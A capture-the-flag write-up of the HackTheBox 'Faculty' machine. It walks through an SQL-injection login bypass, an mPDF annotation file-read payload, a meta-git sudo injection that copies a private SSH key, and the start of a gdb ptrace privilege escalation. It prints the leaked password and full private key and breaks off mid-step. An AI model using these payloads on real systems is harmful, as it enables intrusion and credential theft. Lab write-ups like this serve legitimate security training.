![image](https://user-images.githubusercontent.com/105310322/193358126-9389cc5c-ee9e-474a-8d2e-8b441cc677e4.png)


### Tools: feroxbuster, gdb

### Vulnerabilities: SQLI Auth bypass, PDF LFI, Sudo: Meta-Git, GDB attach process/cap_sys_ptrace

Nmap only finds ssh and a webpage open.

```
└─$ nmap -A -p- -T4 -Pn faculty.htb 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 10:47 CDT
Nmap scan report for faculty.htb (10.129.251.2)
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: School Faculty Scheduling System
|_Requested resource was login.php
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.10 seconds
```
Run a quick feroxbuster before navigating to the webpage and it finds alot. Most notably is the admin/login.php and admin/db_connect.php

```console
─$ feroxbuster -u http://faculty.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
302      GET      359l      693w        0c http://faculty.htb/ => login.php
301      GET        7l       12w      178c http://faculty.htb/admin => http://faculty.htb/admin/
500      GET        0l        0w        0c http://faculty.htb/test.php
200      GET      132l      235w        0c http://faculty.htb/login.php
200      GET      175l      311w        0c http://faculty.htb/admin/login.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets => http://faculty.htb/admin/assets/
301      GET        7l       12w      178c http://faculty.htb/admin/database => http://faculty.htb/admin/database/
200      GET        1l        0w        0c http://faculty.htb/admin/download.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets/css => http://faculty.htb/admin/assets/css/
301      GET        7l       12w      178c http://faculty.htb/admin/assets/js => http://faculty.htb/admin/assets/js/
301      GET        7l       12w      178c http://faculty.htb/admin/assets/img => http://faculty.htb/admin/assets/img/
200      GET        0l        0w        0c http://faculty.htb/admin/ajax.php
200      GET      106l      167w        0c http://faculty.htb/admin/home.php
200      GET       70l      105w        0c http://faculty.htb/admin/users.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets/uploads => http://faculty.htb/admin/assets/uploads/
302      GET      359l      693w        0c http://faculty.htb/index.php => login.php
302      GET      420l      809w        0c http://faculty.htb/admin/index.php => login.php
500      GET       43l       88w        0c http://faculty.htb/admin/events.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets/uploads/gallery => http://faculty.htb/admin/assets/uploads/gallery/
200      GET        0l        0w        0c http://faculty.htb/admin/article.txt
200      GET       47l      106w        0c http://faculty.htb/header.php
200      GET       47l      106w        0c http://faculty.htb/admin/header.php
200      GET      218l      445w        0c http://faculty.htb/admin/courses.php
200      GET      201l      371w        0c http://faculty.htb/admin/schedule.php
200      GET        0l        0w        0c http://faculty.htb/admin/readme.txt
301      GET        7l       12w      178c http://faculty.htb/admin/assets/vendor => http://faculty.htb/admin/assets/vendor/
200      GET      218l      372w        0c http://faculty.htb/admin/faculty.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets/vendor/jquery => http://faculty.htb/admin/assets/vendor/jquery/
200      GET       28l       70w        0c http://faculty.htb/admin/navbar.php
200      GET        0l        0w        0c http://faculty.htb/admin/db_connect.php
200      GET      232l      458w        0c http://faculty.htb/admin/subjects.php
301      GET        7l       12w      178c http://faculty.htb/mpdf => http://faculty.htb/mpdf/
301      GET        7l       12w      178c http://faculty.htb/mpdf/tmp => http://faculty.htb/mpdf/tmp/
301      GET        7l       12w      178c http://faculty.htb/mpdf/includes => http://faculty.htb/mpdf/includes/
500      GET        0l        0w        0c http://faculty.htb/mpdf/config.php
301      GET        7l       12w      178c http://faculty.htb/mpdf/classes => http://faculty.htb/mpdf/classes/
200      GET        0l        0w        0c http://faculty.htb/mpdf/includes/out.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/includes/functions.php
301      GET        7l       12w      178c http://faculty.htb/mpdf/font => http://faculty.htb/mpdf/font/
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/gif.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/graph.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/barcode.php
200      GET       37l       84w        0c http://faculty.htb/topbar.php
200      GET       37l       84w        0c http://faculty.htb/admin/topbar.php
301      GET        7l       12w      178c http://faculty.htb/mpdf/patterns => http://faculty.htb/mpdf/patterns/
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/en.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/de.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/fr.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/sea.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/es.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/it.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/ru.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/nl.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/pl.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/sv.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/patterns/fi.php
301      GET        7l       12w      178c http://faculty.htb/mpdf/qrcode => http://faculty.htb/mpdf/qrcode/
301      GET        7l       12w      178c http://faculty.htb/mpdf/qrcode/data => http://faculty.htb/mpdf/qrcode/data/
500      GET        0l        0w        0c http://faculty.htb/mpdf/qrcode/image.php
200      GET       94l     1552w        0c http://faculty.htb/mpdf/qrcode/index.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/bmp.php
200      GET        1l        1w       29c http://faculty.htb/mpdf/patterns/dictionary.txt
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/grad.php
200      GET        1l       15w        0c http://faculty.htb/mpdf/compress.php
500      GET        0l        0w        0c http://faculty.htb/mpdf/classes/svg.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/meter.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/mpdf.php
200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/myanmar.php
```


The login page looks pretty good and happens to be vulnerable to a SQLI login bypass. I tried using burp intruder for this but it was not working for me. eventually I got it through manual input since I am avoiding using sqlmap these things are tougher.


![image](https://user-images.githubusercontent.com/105310322/193356140-b6d21417-508b-45d5-bacd-9c952ad28fb2.png)


Using the following SQLI we get logged in as admin.

```admin'or'1=1#```

Navigate to this page or any other that has a pdf download. I messed around the next part for awhile before figuring out about the pdf exploit. Then it took some more time to get that working.

![image](https://user-images.githubusercontent.com/105310322/193356340-3232fcd9-d532-42c6-855e-e84e469eca5c.png)


Using this string from the exploit linked below and inputting it into burp we can read local files.

```<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />```
https://www.exploit-db.com/exploits/50995

Also it is needed to be URL encoded twice and then base64 encoded. This can be confirmed by taking the original pdf file code and decoding it.

This can be done multiple ways but I will explain it with burpsuite.

Take the pdf string and throw it into the decoder.

Next decode as base64, then url decode, then url decode again to get a plain text string from the pdf.


```JTI1JTMzJTYzJTI1JTM2JTMxJTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTY2JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMyJTMwJTI1JTM2JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTM2JTM1JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTM5JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTM3JTI1JTM3JTMyJTI1JTM2JTMxJTI1JTM3JTMwJTI1JTM2JTM4JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM3JTM0JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTMxJTI1JTM3JTM0JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM2JTMzJTI1JTM2JTM4JTI1JTM2JTM1JTI1JTM2JTM0JTI1JTMyJTMwJTI1JTM0JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTYxJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTMwJTI1JTM2JTY2JTI1JTM3JTMzJTI1JTMyJTY0JTI1JTM3JTM4JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMzJTMxJTI1JTMzJTM5JTI1JTMzJTM1JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTMzJTY1```



Take your new pdf string and in burpsuite intercept the course list download page.(Its the one that opens up a new tab and opens the pdf file)

Overwrite the original pdf string with your pdf exploit.

```
POST /admin/download.php HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 264
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/admin/index.php?page=courses
Cookie: PHPSESSID=hneu6on85983rv7piegcgjot0d
Cache-Control: max-age=0

pdf=JTI1JTMzJTYzJTI1JTM2JTMxJTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTY2JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMyJTMwJTI1JTM2JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTM2JTM1JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTM5JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTM3JTI1JTM3JTMyJTI1JTM2JTMxJTI1JTM3JTMwJTI1JTM2JTM4JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM3JTM0JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTMxJTI1JTM3JTM0JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM2JTMzJTI1JTM2JTM4JTI1JTM2JTM1JTI1JTM2JTM0JTI1JTMyJTMwJTI1JTM0JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTYxJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTMwJTI1JTM2JTY2JTI1JTM3JTMzJTI1JTMyJTY0JTI1JTM3JTM4JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMzJTMxJTI1JTMzJTM5JTI1JTMzJTM1JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTMzJTY1
```
![image](https://user-images.githubusercontent.com/105310322/193356584-0f2e1e8e-cb1c-4e51-8b61-4b6e9c03fe49.png)


Send it in burpsuite and take the pdf link and put it at the end of your url.


http://faculty.htb/mpdf/tmp/OKQVoYJgi9AqWEu045DZNwdzfX.pdf

Doing so should bring you to a blank page, however attached to the pdf is the file passwd. So download it and we can view it on our machine.

![image](https://user-images.githubusercontent.com/105310322/193356488-7d911901-4866-4208-9d11-0b91ab700a1e.png)


The passwd file gives us 2 users gbyolo and developer. Lets see if we can get anything else.

```console
└─$ cat passwd                     
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

Using the same concept lets try and pull db_connect.php that feroxbuster found earlier.

``````<annotation file="../admin/db_connect.php" content="../admin/db_connect.php" icon="Graph" title="Attached File: ../admin/db_connect.php" pos-x="195" />```

```JTI1JTMzJTYzJTI1JTM2JTMxJTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTY2JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMyJTMwJTI1JTM2JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY1JTI1JTMyJTY1JTI1JTMyJTY2JTI1JTM2JTMxJTI1JTM2JTM0JTI1JTM2JTY0JTI1JTM2JTM5JTI1JTM2JTY1JTI1JTMyJTY2JTI1JTM2JTM0JTI1JTM2JTMyJTI1JTM1JTY2JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTM1JTI1JTM2JTMzJTI1JTM3JTM0JTI1JTMyJTY1JTI1JTM3JTMwJTI1JTM2JTM4JTI1JTM3JTMwJTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTM2JTM1JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY1JTI1JTMyJTY1JTI1JTMyJTY2JTI1JTM2JTMxJTI1JTM2JTM0JTI1JTM2JTY0JTI1JTM2JTM5JTI1JTM2JTY1JTI1JTMyJTY2JTI1JTM2JTM0JTI1JTM2JTMyJTI1JTM1JTY2JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTM1JTI1JTM2JTMzJTI1JTM3JTM0JTI1JTMyJTY1JTI1JTM3JTMwJTI1JTM2JTM4JTI1JTM3JTMwJTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTM5JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTM3JTI1JTM3JTMyJTI1JTM2JTMxJTI1JTM3JTMwJTI1JTM2JTM4JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM3JTM0JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTMxJTI1JTM3JTM0JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM2JTMzJTI1JTM2JTM4JTI1JTM2JTM1JTI1JTM2JTM0JTI1JTMyJTMwJTI1JTM0JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTYxJTI1JTMyJTMwJTI1JTMyJTY1JTI1JTMyJTY1JTI1JTMyJTY2JTI1JTM2JTMxJTI1JTM2JTM0JTI1JTM2JTY0JTI1JTM2JTM5JTI1JTM2JTY1JTI1JTMyJTY2JTI1JTM2JTM0JTI1JTM2JTMyJTI1JTM1JTY2JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTM1JTI1JTM2JTMzJTI1JTM3JTM0JTI1JTMyJTY1JTI1JTM3JTMwJTI1JTM2JTM4JTI1JTM3JTMwJTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTMwJTI1JTM2JTY2JTI1JTM3JTMzJTI1JTMyJTY0JTI1JTM3JTM4JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMzJTMxJTI1JTMzJTM5JTI1JTMzJTM1JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTMzJTY1```

Downloading this file and cating it reveals what might be a password.

```php
└─$ cat db_connect.php 
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
 ```                   

Luckily tring it out with the username we found earlier gets us in!

```console
└─$ ssh gbyolo@faculty.htb          
The authenticity of host 'faculty.htb (10.129.251.2)' can't be established.
ED25519 key fingerprint is SHA256:JYKRgj5yk9qD3GxSCsRAgUIBAhmTssq961F3rHxWlnY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'faculty.htb' (ED25519) to the list of known hosts.
gbyolo@faculty.htb's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Sep 30 19:33:17 CEST 2022

  System load:           0.02
  Usage of /:            80.4% of 4.67GB
  Memory usage:          57%
  Swap usage:            0%
  Processes:             225
  Users logged in:       0
  IPv4 address for eth0: 10.129.251.2
  IPv6 address for eth0: dead:beef::250:56ff:feb9:93ab


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
gbyolo@faculty:~$ 
```
Next we can run sudo -l to see if we find anything. We get back meta-git. There was not anything in GTFO bins for it but I did not an exploit on hacker-one.

https://hackerone.com/reports/728040

```console
gbyolo@faculty:/tmp$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git


https://hackerone.com/reports/728040
```
So we take the command but and cat the id_rsa for the developer user and output it to a file.

```
gbyolo@faculty:/tmp$ sudo -u developer /usr/local/bin/meta-git clone 'sss||cat /home/developer/.ssh/id_rsa > /tmp/id_rsa'
meta git cloning into 'sss||cat /home/developer/.ssh/id_rsa > /tmp/id_rsa' at id_rsa
```

Just like that its ours!

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```
After logging in with our brand new key I messed around for awhile until I realized I was part of a debugging group. 
This group also has access to GDB!

```console
developer@faculty:/tmp$ id
uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
```
```
developer@faculty:/tmp$ find / -group debug 2>/dev/null
/usr/bin/gdb
```
Ive messed with debugging alot so I was interested if we could attach to a process and PE that way and linpeas revealed that gdb has cap_sys_ptrace capability.

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace

GDB has the cap_sys_ptrace capability which I could not find to much info on this specifically.

```console
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                    
Current env capabilities:                                                                                                                          
Current: =
Current proc capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gdb = cap_sys_ptrace+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

So to exploit this lets find a running process by root. Of the ones that populated we could use VGAuthService,vmtoolsd, and dbus-daemon.

```console
developer@faculty:/tmp$ ps faux | grep /usr/bin
root         650  0.0  0.5  46324 10724 ?        Ss   21:22   0:00 /usr/bin/VGAuthService
root         658  0.2  0.4 236540  8464 ?        Ssl  21:22   0:04 /usr/bin/vmtoolsd
message+     689  0.0  0.2   7576  4708 ?        Ss   21:22   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
develop+   35172  0.0  0.0   5192   724 pts/0    S+   21:58   0:00  |           \_ grep --color=auto /usr/bin
develop+    8932  0.0  0.1  79980  3348 ?        SLs  21:25   0:00  \_ /usr/bin/gpg-agent --supervised
